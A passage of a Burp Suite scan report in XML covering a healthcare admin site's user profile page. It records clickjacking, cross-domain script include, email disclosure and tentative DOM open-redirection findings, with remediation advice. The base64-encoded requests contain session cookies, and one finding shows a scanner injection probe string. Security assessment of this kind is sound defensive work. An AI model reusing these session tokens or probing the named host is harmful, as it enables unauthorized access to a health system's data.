N3b3JkIGhhcyBiZWVuIHVwZGF0ZWQgc3VjY2Vzc2Z1bGx5LiJ9]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6645486109792190464</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399]]></path>
    <location><![CDATA[/UserProfile/399]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/clickjacking">Web Security Academy: Clickjacking</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li><li><a href="https://cwe.mitre.org/data/definitions/1021.html">CWE-1021: Improper Restriction of Rendered UI Layers or Frames</a></li><li><a href="https://capec.mitre.org/data/definitions/103.html">CAPEC-103: Clickjacking</a></li></ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9Vc2VyUHJvZmlsZS8zOTkgSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWRlYnJpamhxZmVvdGlqazI5cmEwdHZzcDlsOyBzY3JlZW5XaWR0aD04MDA7IFVzZXJUb3RhbEV2ZW50cz1odHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJUb3RhbEV2ZW50cy8/YWpheD10cnVlOyBzdGFmZkRhc2hib2FyZE9yZ2FuaXphdGlvbj11bmRlZmluZWQ7IHN0YWZmRGFzaGJvYXJkRGF0ZVJhbmdlPU1vbnRobHk7IEFXU0FMQj0xNEExNUIxNERNNStya3c2N3plaXk1MnB6cVBLc0ZweUlXdlFxamxPei80ZTRNNStIVHluQmpabXQ4WG9vL0liNG9Gcy9TTEljT3hjcmJLdkowTEFJamlGWlNyN1ZjajZMRjZzS0haU1dQQkdGbHUwSitwdG1kWTJsRU5HOyBBV1NBTEJDT1JTPTE0QTE1QjE0RE01K3JrdzY3emVpeTUycHpxUEtzRnB5SVd2UXFqbE96LzRlNE01K0hUeW5CalptdDhYb28vSWI0b0ZzL1NMSWNPeGNyYkt2SjBMQUlqaUZaU3I3VmNqNkxGNnNLSFpTV1BCR0ZsdTBKK3B0bWRZMmxFTkcNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vDQpTZWMtQ0gtVUE6ICIuTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEzMSIsICJDaHJvbWl1bSI7dj0iMTMxIg0KU2VjLUNILVVBLVBsYXRmb3JtOiBXaW5kb3dzDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KDQo=]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6432533137439477760</serialNumber>
    <type>5244160</type>
    <name><![CDATA[Cross-domain script include]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399]]></path>
    <location><![CDATA[/UserProfile/399]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>When an application includes a script from an external domain, this script is executed by the browser within the security context of the invoking application. The script can therefore do anything that the application's own scripts can do, such as accessing application data and performing actions within the context of the current user.</p>
<p>If you include a script from an external domain, then you are trusting that domain with the data and functionality of your application, and you are trusting the domain's own security to prevent an attacker from modifying the script to perform malicious actions within your application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Scripts should ideally not be included from untrusted domains. Applications that rely on static third-party scripts should consider using Subresource Integrity to make browsers verify them, or copying the contents of these scripts onto their own domain and including them from there. If that is not possible (e.g. for licensing reasons) then consider reimplementing the script's functionality within application code.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity">Subresource Integrity</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/829.html">CWE-829: Inclusion of Functionality from Untrusted Control Sphere</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The response dynamically includes the following scripts from other domains:<ul><li>https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js</li><li>https://cdnjs.cloudflare.com/ajax/libs/jspdf/1.3.4/jspdf.min.js</li></ul>]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js]]></issueDetailItem>
      <issueDetailItem><![CDATA[https://cdnjs.cloudflare.com/ajax/libs/jspdf/1.3.4/jspdf.min.js]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9Vc2VyUHJvZmlsZS8zOTkgSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWRlYnJpamhxZmVvdGlqazI5cmEwdHZzcDlsOyBzY3JlZW5XaWR0aD04MDA7IFVzZXJUb3RhbEV2ZW50cz1odHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJUb3RhbEV2ZW50cy8/YWpheD10cnVlOyBzdGFmZkRhc2hib2FyZE9yZ2FuaXphdGlvbj11bmRlZmluZWQ7IHN0YWZmRGFzaGJvYXJkRGF0ZVJhbmdlPU1vbnRobHk7IEFXU0FMQj0xNEExNUIxNERNNStya3c2N3plaXk1MnB6cVBLc0ZweUlXdlFxamxPei80ZTRNNStIVHluQmpabXQ4WG9vL0liNG9Gcy9TTEljT3hjcmJLdkowTEFJamlGWlNyN1ZjajZMRjZzS0haU1dQQkdGbHUwSitwdG1kWTJsRU5HOyBBV1NBTEJDT1JTPTE0QTE1QjE0RE01K3JrdzY3emVpeTUycHpxUEtzRnB5SVd2UXFqbE96LzRlNE01K0hUeW5CalptdDhYb28vSWI0b0ZzL1NMSWNPeGNyYkt2SjBMQUlqaUZaU3I3VmNqNkxGNnNLSFpTV1BCR0ZsdTBKK3B0bWRZMmxFTkcNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vDQpTZWMtQ0gtVUE6ICIuTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEzMSIsICJDaHJvbWl1bSI7dj0iMTMxIg0KU2VjLUNILVVBLVBsYXRmb3JtOiBXaW5kb3dzDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KDQo=]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6171242930729370624</serialNumber>
    <type>6291968</type>
    <name><![CDATA[Email addresses disclosed]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399]]></path>
    <location><![CDATA[/UserProfile/399]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The presence of email addresses within application responses does not necessarily constitute a security vulnerability. Email addresses may appear intentionally within contact information, and many applications (such as web mail) include arbitrary third-party email addresses within their core content.</p>
<p>However, email addresses of developers and other individuals (whether appearing on-screen or hidden within page source) may disclose information that is useful to an attacker; for example, they may represent usernames that can be used at the application's login, and they may be used in social engineering attacks against the organization's personnel. Unnecessary or excessive disclosure of email addresses may also lead to an increase in the volume of spam email received.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Consider removing any email addresses that are unnecessary, or replacing personal addresses with anonymous mailbox addresses (such as helpdesk@example.com).</p>
<p>To reduce the quantity of spam sent to anonymous mailbox addresses, consider hiding the email address and instead providing a form that generates the email server-side, protected by a CAPTCHA if necessary. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/information-disclosure">Web Security Academy: Information disclosure</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200: Information Exposure</a></li><li><a href="https://capec.mitre.org/data/definitions/37.html">CAPEC-37: Retrieve Embedded Sensitive Data</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The following email address was disclosed in the response:<ul><li>bahaa@cyparta.com</li></ul>]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[bahaa@cyparta.com]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9Vc2VyUHJvZmlsZS8zOTkgSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWRlYnJpamhxZmVvdGlqazI5cmEwdHZzcDlsOyBzY3JlZW5XaWR0aD04MDA7IFVzZXJUb3RhbEV2ZW50cz1odHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJUb3RhbEV2ZW50cy8/YWpheD10cnVlOyBzdGFmZkRhc2hib2FyZE9yZ2FuaXphdGlvbj11bmRlZmluZWQ7IHN0YWZmRGFzaGJvYXJkRGF0ZVJhbmdlPU1vbnRobHk7IEFXU0FMQj0xNEExNUIxNERNNStya3c2N3plaXk1MnB6cVBLc0ZweUlXdlFxamxPei80ZTRNNStIVHluQmpabXQ4WG9vL0liNG9Gcy9TTEljT3hjcmJLdkowTEFJamlGWlNyN1ZjajZMRjZzS0haU1dQQkdGbHUwSitwdG1kWTJsRU5HOyBBV1NBTEJDT1JTPTE0QTE1QjE0RE01K3JrdzY3emVpeTUycHpxUEtzRnB5SVd2UXFqbE96LzRlNE01K0hUeW5CalptdDhYb28vSWI0b0ZzL1NMSWNPeGNyYkt2SjBMQUlqaUZaU3I3VmNqNkxGNnNLSFpTV1BCR0ZsdTBKK3B0bWRZMmxFTkcNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vDQpTZWMtQ0gtVUE6ICIuTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEzMSIsICJDaHJvbWl1bSI7dj0iMTMxIg0KU2VjLUNILVVBLVBsYXRmb3JtOiBXaW5kb3dzDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KDQo=]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8140432385851219968</serialNumber>
    <type>5243152</type>
    <name><![CDATA[Open redirection (DOM-based)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399]]></path>
    <location><![CDATA[/UserProfile/399]]></location>
    <severity>Low</severity>
    <confidence>Tentative</confidence>
    <issueBackground><![CDATA[<p>DOM-based vulnerabilities arise when a client-side script reads data from a controllable part of the DOM (for example, the URL) and processes this data in an unsafe way.</p>

<p>DOM-based open redirection arises when a script  writes controllable data into the target of a redirection in an unsafe way. An attacker may be able to use the vulnerability to  construct a URL that, if visited by another application user, will cause a redirection to an arbitrary external domain. This behavior can be leveraged to facilitate phishing attacks against users of the application. The ability to use an authentic application URL, targeting the correct domain and with a valid SSL certificate (if SSL is used), lends credibility to the phishing attack because many users, even if they verify these features, will not notice the subsequent redirection to a different domain.</p>
<p><b>Note:</b> If an attacker is able to control the start of the string that is passed to the redirection API, then it may be possible to escalate this vulnerability into a JavaScript injection attack, by using a URL with the javascript: pseudo-protocol to execute arbitrary script code when the URL is processed by the browser.</p>

<p>Burp Suite automatically identifies this issue using dynamic and static code analysis. Static analysis can lead to false positives that are not actually exploitable. If Burp Scanner has not provided any evidence resulting from dynamic analysis, you should review the relevant code and execution paths  to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to avoid DOM-based open redirection vulnerabilities is not to dynamically set redirection targets using data that originated from any untrusted source. If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code to prevent malicious data from introducing an arbitrary URL as a redirection target. In general, this is best achieved by using a whitelist of URLs that are permitted redirection targets, and strictly validating the target against this list before performing the redirection.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/dom-based/open-redirection">Web Security Academy: Open redirection (DOM-based)</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/601.html">CWE-601: URL Redirection to Untrusted Site ('Open Redirect')</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The application may be vulnerable to DOM-based open redirection. Data is read from <b>input.value</b> and passed to <b>xhr.open</b>.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9Vc2VyUHJvZmlsZS8zOTkgSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWRlYnJpamhxZmVvdGlqazI5cmEwdHZzcDlsOyBzY3JlZW5XaWR0aD04MDA7IFVzZXJUb3RhbEV2ZW50cz1odHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJUb3RhbEV2ZW50cy8/YWpheD10cnVlOyBzdGFmZkRhc2hib2FyZE9yZ2FuaXphdGlvbj11bmRlZmluZWQ7IHN0YWZmRGFzaGJvYXJkRGF0ZVJhbmdlPU1vbnRobHk7IEFXU0FMQj0xNEExNUIxNERNNStya3c2N3plaXk1MnB6cVBLc0ZweUlXdlFxamxPei80ZTRNNStIVHluQmpabXQ4WG9vL0liNG9Gcy9TTEljT3hjcmJLdkowTEFJamlGWlNyN1ZjajZMRjZzS0haU1dQQkdGbHUwSitwdG1kWTJsRU5HOyBBV1NBTEJDT1JTPTE0QTE1QjE0RE01K3JrdzY3emVpeTUycHpxUEtzRnB5SVd2UXFqbE96LzRlNE01K0hUeW5CalptdDhYb28vSWI0b0ZzL1NMSWNPeGNyYkt2SjBMQUlqaUZaU3I3VmNqNkxGNnNLSFpTV1BCR0ZsdTBKK3B0bWRZMmxFTkcNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vDQpTZWMtQ0gtVUE6ICIuTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEzMSIsICJDaHJvbWl1bSI7dj0iMTMxIg0KU2VjLUNILVVBLVBsYXRmb3JtOiBXaW5kb3dzDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KDQo=]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <dynamicAnalysis>
      <source>input.value</source>
      <sink>xhr.open</sink>
      <sourceStackTrace>at Object.BQODu (&lt;anonymous&gt;:1:95774)
at Object.USBMk (&lt;anonymous&gt;:1:394438)
at HTMLInputElement.get (&lt;anonymous&gt;:1:398284)
at HTMLInputElement.get [as value] (&lt;anonymous&gt;:1:514193)
at HTMLInputElement.onkeyup (https://admin.miradorhealth.com/UserProfile/399:41:163)
at _0x372f23 (&lt;anonymous&gt;:1:148382)
at Object.NQWnL (&lt;anonymous&gt;:1:8863)
at _0x2a880c (&lt;anonymous&gt;:1:153429)
at Object.fEpIW (&lt;anonymous&gt;:1:94004)
at _0x4ca456 (&lt;anonymous&gt;:1:574787)</sourceStackTrace>
      <sinkStackTrace>at Object.XMhUr (&lt;anonymous&gt;:1:544502)
at _0x13dcf0 (&lt;anonymous&gt;:1:558761)
at _0xdc6a5f.&lt;computed&gt;._0x13cc4d.oknbI._0x3e2633.XMLHttpRequest.&lt;computed&gt; [as open] (&lt;anonymous&gt;:1:458938)
at Object.send (https://admin.miradorhealth.com/js/jquery.min.js:4:26275)
at Function.ajax (https://admin.miradorhealth.com/js/jquery.min.js:4:22180)
at advSearch (https://admin.miradorhealth.com/js/scripts.js?v=f72d42:11:11)
at HTMLInputElement.onkeyup (https://admin.miradorhealth.com/UserProfile/399:41:148)
at _0x372f23 (&lt;anonymous&gt;:1:148382)
at Object.NQWnL (&lt;anonymous&gt;:1:8863)
at _0x2a880c (&lt;anonymous&gt;:1:153429)
at Object.fEpIW (&lt;anonymous&gt;:1:94004)
at _0x4ca456 (&lt;anonymous&gt;:1:574787)</sinkStackTrace>
      <eventListenerStackTrace></eventListenerStackTrace>
      <sourceValue></sourceValue>
      <sinkValue>https://admin.miradorhealth.com/Search/sycb4cs9ty%2527%2522`&apos;&quot;/sycb4cs9ty/&gt;&lt;sycb4cs9ty/\&gt;nxj524zqow&amp;</sinkValue>
      <eventHandlerData></eventHandlerData>
      <eventHandlerDataType></eventHandlerDataType>
      <eventHandlerManipulatedData></eventHandlerManipulatedData>
      <poc></poc>
      <origin></origin>
      <isOriginChecked>false</isOriginChecked>
      <sourceElementId></sourceElementId>
      <sourceElementName></sourceElementName>
      <eventFiredEventName>keyup</eventFiredEventName>
      <eventFiredElementId></eventFiredElementId>
      <eventFiredElementName></eventFiredElementName>
      <eventFiredOuterHtml>&lt;input class=&quot;form-control&quot; type=&quot;search&quot; placeholder=&quot;Search&quot; aria-label=&quot;Search&quot; onkeyup=&quot;advSearc</eventFiredOuterHtml>
    </dynamicAnalysis>
  </issue>
  <issue>
    <serialNumber>2937104540196131840</serialNumber>
    <type>5243152</type>
    <name><![CDATA[Open redirection (DOM-based)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399]]></path>
    <location><![CDATA[/UserProfile/399]]></location>
    <severity>Low</severity>
    <confidence>Tentative</confidence>
    <issueBackground><![CDATA[<p>DOM-based vulnerabilities arise when a client-side script reads data from a controllable part of the DOM (for example, the URL) and processes this data in an unsafe way.</p>

<p>DOM-based open redirection arises when a script  writes controllable data into the target of a redirection in an unsafe way. An attacker may be able to use the vulnerability to  construct a URL that, if visited by another application user, will cause a redirection to an arbitrary external domain. This behavior can be leveraged to facilitate phishing attacks against users of the application. The ability to use an authentic application URL, targeting the correct domain and with a valid SSL certificate (if SSL is used), lends credibility to the phishing attack because many users, even if they verify these features, will not notice the subsequent redirection to a different domain.</p>
<p><b>Note:</b> If an attacker is able to control the start of the string that is passed to the redirection API, then it may be possible to escalate this vulnerability into a JavaScript injection attack, by using a URL with the javascript: pseudo-protocol to execute arbitrary script code when the URL is processed by the browser.</p>

<p>Burp Suite automatically identifies this issue using dynamic and static code analysis. Static analysis can lead to false positives that are not actually exploitable. If Burp Scanner has not provided any evidence resulting from dynamic analysis, you should review the relevant code and execution paths  to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to avoid DOM-based open redirection vulnerabilities is not to dynamically set redirection targets using data that originated from any untrusted source. If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code to prevent malicious data from introducing an arbitrary URL as a redirection target. In general, this is best achieved by using a whitelist of URLs that are permitted redirection targets, and strictly validating the target against this list before performing the redirection.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/dom-based/open-redirection">Web Security Academy: Open redirection (DOM-based)</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/601.html">CWE-601: URL Redirection to Untrusted Site ('Open Redirect')</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The application may be vulnerable to DOM-based open redirection. Data is read from <b>location.href</b> and passed to <b>xhr.open</b>.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9Vc2VyUHJvZmlsZS8zOTkgSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWRlYnJpamhxZmVvdGlqazI5cmEwdHZzcDlsOyBzY3JlZW5XaWR0aD04MDA7IFVzZXJUb3RhbEV2ZW50cz1odHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJUb3RhbEV2ZW50cy8/YWpheD10cnVlOyBzdGFmZkRhc2hib2FyZE9yZ2FuaXphdGlvbj11bmRlZmluZWQ7IHN0YWZmRGFzaGJvYXJkRGF0ZVJhbmdlPU1vbnRobHk7IEFXU0FMQj0xNEExNUIxNERNNStya3c2N3plaXk1MnB6cVBLc0ZweUlXdlFxamxPei80ZTRNNStIVHluQmpabXQ4WG9vL0liNG9Gcy9TTEljT3hjcmJLdkowTEFJamlGWlNyN1ZjajZMRjZzS0haU1dQQkdGbHUwSitwdG1kWTJsRU5HOyBBV1NBTEJDT1JTPTE0QTE1QjE0RE01K3JrdzY3emVpeTUycHpxUEtzRnB5SVd2UXFqbE96LzRlNE01K0hUeW5CalptdDhYb28vSWI0b0ZzL1NMSWNPeGNyYkt2SjBMQUlqaUZaU3I3VmNqNkxGNnNLSFpTV1BCR0ZsdTBKK3B0bWRZMmxFTkcNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vDQpTZWMtQ0gtVUE6ICIuTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEzMSIsICJDaHJvbWl1bSI7dj0iMTMxIg0KU2VjLUNILVVBLVBsYXRmb3JtOiBXaW5kb3dzDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KDQo=]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <dynamicAnalysis>
      <source>location.href</source>
      <sink>xhr.open</sink>
      <sourceStackTrace>at Object._0x165f99 [as proxiedGetterCallback] (&lt;anonymous&gt;:1:557377)
at get href (&lt;anonymous&gt;:1:249544)
at editProfileModal (https://admin.miradorhealth.com/UserProfile/399:365:31)
at HTMLButtonElement.onclick (https://admin.miradorhealth.com/UserProfile/399:207:215)
at _0x14405e (&lt;anonymous&gt;:1:147957)
at _0x2a880c (&lt;anonymous&gt;:1:151903)
at Object.fEpIW (&lt;anonymous&gt;:1:94004)
at _0x4ca456 (&lt;anonymous&gt;:1:574787)</sourceStackTrace>
      <sinkStackTrace>at Object.XMhUr (&lt;anonymous&gt;:1:544502)
at _0x13dcf0 (&lt;anonymous&gt;:1:558761)
at _0xdc6a5f.&lt;computed&gt;._0x13cc4d.oknbI._0x3e2633.XMLHttpRequest.&lt;computed&gt; [as open] (&lt;anonymous&gt;:1:458938)
at Object.send (https://admin.miradorhealth.com/js/jquery.min.js:4:26275)
at Function.ajax (https://admin.miradorhealth.com/js/jquery.min.js:4:22180)
at editProfileModal (https://admin.miradorhealth.com/UserProfile/399:366:7)
at HTMLButtonElement.onclick (https://admin.miradorhealth.com/UserProfile/399:207:215)
